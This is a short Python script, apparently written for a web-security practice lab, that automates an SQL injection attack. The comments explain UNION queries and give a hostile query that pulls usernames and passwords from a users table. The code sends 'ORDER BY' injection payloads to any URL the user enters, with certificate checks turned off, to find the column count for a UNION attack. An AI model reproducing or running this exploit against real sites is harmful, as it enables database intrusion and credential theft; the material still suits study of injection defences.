#Background (UNION)


# talbe1     table2
# a | b      c | d    
# -----------------
# 1 , 2      3 , 4
# 3 , 4      4 , 5

# Query 1#:
# SELECT a,b FROM table1
# result#:
# 1 , 2
# 3 , 4

# Query 2#:
# SELECT a,b FROM table1 UNION SELECT c,d FROM table2
# result #:
    # 1,2
    # 3,4
    # 3,4
    # 4,5


# Malecious Query #:
# SELECT a,b FROM table1 UNION SELECT username , password FROM users


 
import requests 
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s=requests.Session()
def sql_exploit(s,url):
    """Determing Number of columns using oder by Query."""
    path="filter?category=Gifts"
    for i in range(1,50):
        payload=f"'order by {i} -- "
        response=s.get(url+path+payload,verify=False)
        
        if 'Internal Server Error' in response.text:
            return i-1
       
    return 0
        

if __name__ == "__main__":
    
    try:
        url=input("Please enter base url : ")
        
        if not url:
            raise ValueError("URL and payload cannot be empty.")
        
        num_col=sql_exploit(s,url)
        print(f"Finding out number of column : ")
        if num_col >0 :
            print(f"Number of column return by Query is {str(num_col)}")
        else:
            print('[-] Sql Injection unsuccesful : ')
            
    except Exception as e:
        print(f'error {e} ')